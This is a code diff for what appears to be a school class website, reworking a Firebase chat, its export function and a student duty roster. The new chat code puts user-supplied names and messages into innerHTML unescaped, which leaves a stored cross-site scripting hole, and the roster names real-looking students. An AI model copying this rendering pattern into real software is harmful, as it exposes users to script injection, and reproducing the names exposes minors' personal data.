+            displayTime = `${dayName}, ${d.getDate()}/${d.getMonth() + 1}/${d.getFullYear()} ${String(d.getHours()).padStart(2, "0")}:${String(d.getMinutes()).padStart(2, "0")}`;
+          }
+
+          const safeText = filterProfanity(msg.text);
+
+          const bubble = document.createElement("div");
+          bubble.className = `chat-bubble ${isMe ? "chat-bubble-me" : "chat-bubble-other"} animate-popIn`;
+
+          bubble.innerHTML = `
+                <div class="flex items-center justify-between mb-1 flex-wrap gap-1">
+                    <div class="font-bold text-xs ${isMe ? "text-white" : "text-purple-600"}">
+                        ${msg.name}
+                    </div>
+                    <div class="text-xs opacity-70 w-full md:w-auto text-left md:text-right">${displayTime}</div>
                 </div>
-                <div class="text-xs opacity-70">${time}</div>
-            </div>
-            <div class="text-sm">${msg.text}</div>
-        `;
-            chatBox.appendChild(bubble);
+                <div class="text-sm mt-1">${safeText}</div>
+            `;
+          chatBox.appendChild(bubble);
         });
-
-    
         chatBox.scrollTop = chatBox.scrollHeight;
-    }
+      }
 
-    function sendMessage() {
-        const nameInput = document.getElementById('chatName');
-        const msgInput = document.getElementById('chatMessage');
+      function sendMessage() {
+        const nameInput = document.getElementById("chatName");
+        const msgInput = document.getElementById("chatMessage");
 
         const name = nameInput.value.trim() || "Anonim";
-        const text = msgInput.value.trim();
+        let text = msgInput.value.trim();
 
         if (!text) {
-            showNotification("⚠️ Pesan tidak boleh kosong!");
-            msgInput.focus();
-            return;
+          showNotification("⚠️ Pesan tidak boleh kosong!");
+          msgInput.focus();
+          return;
         }
+
+        text = filterProfanity(text);
 
         if (!isFirebaseReady) {
-            alert("❌ Database tidak terhubung! Periksa koneksi internet.");
-            return;
+          alert("❌ Database tidak terhubung! Periksa koneksi internet.");
+          return;
         }
 
-        localStorage.setItem('pplg_last_user', name);
-        if (!nameInput.value.trim()) {
-            nameInput.value = name;
-        }
+        localStorage.setItem("pplg_last_user", name);
+        if (!nameInput.value.trim()) nameInput.value = name;
 
         const now = new Date();
-        const time = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
 
-        
-        messagesRef.push({
-                name: name,
-                text: text,
-                time: time,
-                timestamp: Date.now()
-            })
-            .then(() => {
-                // Sukses
-                msgInput.value = '';
-                msgInput.focus();
-                showNotification(`📤 Pesan terkirim sebagai "${name}"`);
-            })
-            .catch((error) => {
-                console.error("Error sending message:", error);
-                showNotification("❌ Gagal mengirim pesan!");
-            });
-    }
+        const days = [
+          "Sunday",
+          "Monday",
+          "Tuesday",
+          "Wednesday",
+          "Thursday",
+          "Friday",
+          "Saturday",
+        ];
+        const dayName = days[now.getDay()];
+        const date = `${dayName}, ${now.getDate()}/${now.getMonth() + 1}/${now.getFullYear()}`;
+        const time = `${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}`;
+        const fullDate = `${date} ${time}`;
 
-    function exportChat() {
+        messagesRef
+          .push({
+            name: name,
+            text: text,
+            time: time,
+            date: fullDate,
+            timestamp: Date.now(),
+          })
+          .then(() => {
+            msgInput.value = "";
+            msgInput.focus();
+            showNotification(`📤 Pesan terkirim!`);
+          })
+          .catch((error) => {
+            console.error("Error sending message:", error);
+            showNotification("❌ Gagal mengirim pesan!");
+          });
+      }
+
+      function exportChat() {
         if (!isFirebaseReady) {
-            showNotification("❌ Database tidak terhubung!");
-            return;
+          showNotification("❌ Database tidak terhubung!");
+          return;
         }
+        messagesRef.once("value").then((snapshot) => {
+          const data = snapshot.val();
+          if (!data) {
+            showNotification("📭 Tidak ada data.");
+            return;
+          }
 
-        messagesRef.once('value')
-            .then((snapshot) => {
-                const data = snapshot.val();
-                if (!data) {
-                    showNotification("📭 Tidak ada data chat untuk diexport.");
-                    return;
-                }
+          let textContent = "=== RIWAYAT CHAT XI PPLG ===\n";
+          textContent += `Di-export: ${new Date().toLocaleString("id-ID")}\n\n`;
 
-                let textContent = "=== RIWAYAT CHAT XI PPLG ===\n";
-                textContent += `Di-export: ${new Date().toLocaleString('id-ID')}\n`;
-                textContent += "================================\n\n";
+          const messages = Object.entries(data)
+            .map(([k, v]) => ({ id: k, ...v }))
+            .sort((a, b) => a.timestamp - b.timestamp);
+          messages.forEach((msg) => {
+            const safeText = filterProfanity(msg.text);
+            const timeDisplay = msg.date || msg.time || "--:--";
+            textContent += `[${timeDisplay}] ${msg.name}: ${safeText}\n`;
+          });
 
-               
-                const messages = Object.entries(data)
-                    .map(([key, value]) => ({
-                        id: key,
-                        ...value
-                    }))
-                    .sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
-
-                messages.forEach(msg => {
-                    textContent += `[${msg.time || '--:--'}] ${msg.name}: ${msg.text}\n`;
-                });
-
-                textContent += `\nTotal pesan: ${messages.length}`;
-
-            
-                const blob = new Blob([textContent], {
-                    type: 'text/plain;charset=utf-8'
-                });
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = `chat_pplg_${new Date().toISOString().split('T')[0]}.txt`;
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-                URL.revokeObjectURL(url);
-
-                showNotification("📥 Chat berhasil di-export!");
-            })
-            .catch((error) => {
-                console.error("Error exporting chat:", error);
-                showNotification("❌ Gagal mengexport chat!");
-            });
-    }
-
-   
-    const piketData = {
-        senin: ["Rania Larasati Queen", "Zidan Muhammad Sauki", "Khayla Mazaya", "Ikmal Murial Devano", "Amru Naufal", "Abdul Muhaimin", "Muhammad Husein", "Alif Putra Perkasa"],
-        selasa: ["Zaim Raji Habibi", "Dzikra Humairo.S", "Daniella Zaina", "Rafiq Al Habib", "Yahya Fibert C", "Raja Fathur", "M Irfan Azzaky", "Atha Ramadhan"],
-        rabu: ["Fairuz Dzikri", "Naila Nurul", "Pricilla Putri Yemima", "M Rifki Fahrezi", "Tantra Hunafa", "Abiyyu Athalian", "Arya Rafka", "Beny Adrian Tobing"],
-        kamis: ["Izra Rakhi Muhammad", "Nasyafa Ivana", "Athifa Mahirah Putri", "Agung Dwi", "Dzaki Afkar", "Rafi Hibatullah", "Tafayat Raziq"],
-        jumat: ["M Fathul Al-fath", "Fairuz Naufal", "Awen Akiyan", "M Syahru Ramadhan", "Aisyah Calsih", "Rizky Ardiansyah", "Aisyah Azmi"]
-    };
-        
-    function renderPiket(day) {
-        const container = document.getElementById('piketContent');
-        const names = piketData[day];
-        container.innerHTML = `<div class="grid md:grid-cols-2 gap-3">${names.map((name, i) => `<div class="flex items-center gap-3 p-3 bg-white border-3 border-[var(--outline)] rounded-xl hover:shadow-lg transition-all cursor-pointer group"><div class="w-8 h-8 rounded-full bg-gradient-to-br from-purple-400 to-pink-400 flex items-center justify-center text-white font-bold text-sm group-hover:scale-110 transition-transform">${i + 1}</div><span class="font-medium text-sm">${name}</span></div>`).join('')}</div>`;
-    }
-    
-    function appendCalc(val) { if (calcValue === '0' && !isNaN(val)) calcValue = val; else calcValue += val; document.getElementById('calcDisplay').textContent = calcValue; }
-    function clearCalc() { calcValue = '0'; document.getElementById('calcDisplay').textContent = '0'; }
-    function calculateCalc() { try { calcValue = String(eval(calcValue)); document.getElementById('calcDisplay').textContent = calcValue; } catch (e) { document.getElementById('calcDisplay').textContent = 'Error'; calcValue = '0'; } }
-
-    function showLogin() { document.getElementById('loginDialog').classList.add('active'); }
-    function closeLogin() { document.getElementById('loginDialog').classList.remove('active'); }
-    function attemptLogin() { const u = document.getElementById('username').value; if(u) { showNotification(`Selamat datang, ${u}!`); closeLogin(); } else showNotification('Isi username!'); }
-
-    function toggleStartMenu() {
-        const menu = document.getElementById('startMenu');
-        const isVisible = menu.style.opacity === '1';
-        if (isVisible) { menu.style.opacity = '0'; menu.style.visibility = 'hidden'; menu.style.transform = 'translateY(16px)'; } 
-        else { menu.style.opacity = '1'; menu.style.visibility = 'visible'; menu.style.transform = 'translateY(0)'; }
-    }
-    
-    document.addEventListener('click', (e) => {
-        const menu = document.getElementById('startMenu'); const startBtn = document.getElementById('startBtn');
-        if (!menu.contains(e.target) && !startBtn.contains(e.target)) { menu.style.opacity = '0'; menu.style.visibility = 'hidden'; }
-    });
-
-    function showNotification(text) { const n = document.getElementById('notification'); document.getElementById('notificationText').textContent = text; n.classList.add('show'); setTimeout(() => n.classList.remove('show'), 4000); }
-    function scrollToSection(id) { document.getElementById(id)?.scrollIntoView({ behavior: 'smooth' }); }
-
-    document.addEventListener('DOMContentLoaded', () => {
-        
-        document.querySelectorAll('.tab-y2k').forEach(tab => {
-            tab.addEventListener('click', () => {
-                document.querySelectorAll('.tab-y2k').forEach(t => t.classList.remove('active'));
-                tab.classList.add('active');
-                renderPiket(tab.dataset.day);
-            });
+          const blob = new Blob([textContent], { type: "text/plain" });
+          const a = document.createElement("a");
+          a.href = URL.createObjectURL(blob);
+          a.download = `chat_pplg_${new Date().toISOString().split("T")[0]}.txt`;
+          a.click();
+          showNotification("📥 Berhasil download!");
         });
-        renderPiket('senin');
+      }
 
-     
+      const piketData = {
+        senin: [
+          "Abdul Muhaimin",
+          "Alif Putra Perkasa",
+          "Amru Naufal",
+          "Ikmal Murial Devano",
+          "Khayla Mazaya",
+          "Muhammad Atha",
+          "Muhammad Husein",
+          "Zidan Muhammad Sauki",
+        ],
+        selasa: [
+          "Daniella Zaina",
+          "Dzikra Humairo.S",
+          "M Irfan Azzaky",
+          "Rafiq Al Habib",
+          "Raja Fathur",
+          "Rania Larasati Queen",
+          "Yahya Fibert C",
+          "Zaim Raji Habibi",
+        ],
+        rabu: [
+          "Abiyyu Athalian",
+          "Arya Rafka",
+          "Beny Adrian Tobing",
+          "Fairuz Dzikri",
+          "M Rifki Fahrezi",
+          "Naila Nurul",
+          "Pricilla Putri Yemima",
+          "Tantra Hunafa",
+        ],
+        kamis: [
+          "Agung Dwi",
+          "Athifa Mahirah Putri",
+          "Dzaki Afkar",
+          "Izra Rakhi Muhammad",
+          "Muhammad Zamri",
+          "Nasyafa Ivana",
+          "Rafi Hibatullah",
+          "Tafayat Raziq",
+        ],
+        jumat: [
+          "Aisyah Azmi",
+          "Aisyah Calsih",
+          "Awen Akiyan",
+          "Fairuz Naufal",
+          "M Fathul Al-fath",
+          "M Syahru Ramadhan",
+          "Rizky Ardiansyah",
+        ],
+      };
+
+      function renderPiket(day) {
+        const container = document.getElementById("piketContent");
+        const names = piketData[day];
+        container.innerHTML = `<div class="grid md:grid-cols-2 gap-3">${names.map((name, i) => `<div class="flex items-center gap-3 p-3 bg-white border-3 border-[var(--outline)] rounded-xl hover:shadow-lg transition-all cursor-pointer group"><div class="w-8 h-8 rounded-full bg-gradient-to-br from-purple-400 to-pink-400 flex items-center justify-center text-white font-bold text-sm group-hover:scale-110 transition-transform">${i + 1}</div><span class="font-medium text-sm">${name}</span></div>`).join("")}</div>`;
+      }
+
+      function toggleStartMenu() {
+        const menu = document.getElementById("startMenu");
+        const isVisible = menu.style.opacity === "1";
+        if (isVisible) {
+          menu.style.opacity = "0";
+          menu.style.visibility = "hidden";
+          menu.style.transform = "translateY(16px)";
+        } else {
+          menu.style.opacity = "1";
+          menu.style.visibility = "visible";
+          menu.style.transform = "translateY(0)";
+        }
+      }
+
+      document.addEventListener("click", (e) => {
+        const menu = document.getElementById("startMenu");
+        const startBtn = document.getElementById("startBtn");
+        if (!menu.contains(e.target) && !startBtn.contains(e.target)) {
+          menu.style.opacity = "0";
+          menu.style.visibility = "hidden";
+        }
+      });
+
+      function showNotification(text) {
+        const n = document.getElementById("notification");
+        document.getElementById("notificationText").textContent = text;
+        n.classList.add("show");
+        setTimeout(() => n.classList.remove("show"), 4000);
+      }
+      function scrollToSection(id) {
+        document.getElementById(id)?.scrollIntoView({ behavior: "smooth" });
+      }
+
+      document.addEventListener("DOMContentLoaded", () => {
+        document.querySelectorAll(".tab-y2k").forEach((tab) => {
+          tab.addEventListener("click", () => {
+            document
+              .querySelectorAll(".tab-y2k")
+              .forEach((t) => t.classList.remove("active"));
+            tab.classList.add("active");
+            renderPiket(tab.dataset.day);
+          });
+        });
+        renderPiket("senin");
+
         function updateClock() {
-            const now = new Date();
-            document.getElementById('clock').textContent =
-                `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
+          const now = new Date();
+          document.getElementById("clock").textContent =
+            `${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}`;
         }
         updateClock();
-        setInterval(updateClock, 60000);
+        setInterval(updateClock, 1000);
+        const TWENTY_FOUR_HOURS = 24 * 60 * 60 * 1000;
+        const lastBootTime = localStorage.getItem("pplg_last_boot_time");
+        const now = Date.now();
+        const isStillValid =
+          lastBootTime && now - parseInt(lastBootTime) < TWENTY_FOUR_HOURS;
 
-      
-        setTimeout(() => {
-            const bootScreen = document.getElementById('bootScreen');
-            const bootProgress = document.getElementById('bootProgress');
-            const bootText = document.getElementById('bootText');
+        if (isStillValid) {
+          const bootScreen = document.getElementById("bootScreen");
+          const mainContent = document.getElementById("mainContent");
+
+          bootScreen.style.display = "none";
+          mainContent.style.opacity = "1";
+
+          if (isFirebaseReady) {
+            listenToChat();
+
+            const lastUser = localStorage.getItem("pplg_last_user");
+            if (lastUser) document.getElementById("chatName").value = lastUser;
+          } else {
+            document.getElementById("chatBox").innerHTML =
+              '<div class="text-red-500 font-pixel text-center p-4">❌ Gagal konek ke database!</div>';
+          }
+        } else {
+          setTimeout(() => {
+            const bootScreen = document.getElementById("bootScreen");
+            const bootProgress = document.getElementById("bootProgress");
+            const bootText = document.getElementById("bootText");
 
             let progress = 0;
             const interval = setInterval(() => {
-                progress += Math.random() * 15 + 5;
-                if (progress > 100) progress = 100;
-                bootProgress.style.width = `${progress}%`;
+              progress += Math.random() * 15 + 5;
+              if (progress > 100) progress = 100;
+              bootProgress.style.width = `${progress}%`;
 
-                if (progress < 30) bootText.textContent = "Loading system...";
-                else if (progress < 60) bootText.textContent = "Initializing database...";
-                else if (progress < 90) bootText.textContent = "Connecting to cloud...";
-                else bootText.textContent = "Ready to launch!";
+              if (progress < 30) bootText.textContent = "Loading system...";
+              else if (progress < 60)
+                bootText.textContent = "Initializing database...";
+              else if (progress < 90)
+                bootText.textContent = "Connecting to cloud...";
+              else bootText.textContent = "Ready to launch!";
 
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    setTimeout(() => {
-                        bootScreen.style.opacity = '0';
-                        setTimeout(() => {
-                            bootScreen.style.display = 'none';
-                            document.getElementById('mainContent').style.opacity = '1';
+              if (progress >= 100) {
+                clearInterval(interval);
 
-                          
-                            if (isFirebaseReady) {
-                                listenToChat();
-                                showNotification('✅ Terhubung ke Cloud Database!');
+                setTimeout(() => {
+                  bootScreen.style.opacity = "0";
+                  setTimeout(() => {
+                    bootScreen.style.display = "none";
+                    document.getElementById("mainContent").style.opacity = "1";
+                    localStorage.setItem(
+                      "pplg_last_boot_time",
+                      Date.now().toString(),
+                    );
 
-                                
-                                const lastUser = localStorage.getItem('pplg_last_user');
-                                if (lastUser) {
-                                    document.getElementById('chatName').value = lastUser;
-                                    document.getElementById('chatMessage').focus();
-                                }
-                            } else {
-                                document.getElementById('chatBox').innerHTML =
-                                    '<div class="text-red-500 font-pixel text-center p-4">❌ Gagal konek ke database!</div>';
-                                showNotification("⚠️ Error: Periksa koneksi internet!");
-                            }
-                        }, 300);
-                    }, 500);
-                }
+                    if (isFirebaseReady) {
+                      listenToChat();
+
+                      const lastUser = localStorage.getItem("pplg_last_user");
+                      if (lastUser) {
+                        document.getElementById("chatName").value = lastUser;
+                      }
+                    } else {
+                      document.getElementById("chatBox").innerHTML =
+                        '<div class="text-red-500 font-pixel text-center p-4">❌ Gagal konek ke database!</div>';
+                    }
+                  }, 300);
+                }, 500);
+              }
             }, 100);
-        }, 1000);
-    });
-</script>
-</body>
-
+          }, 1000);
+        }
+      });
+    </script>
+  </body>
 </html>
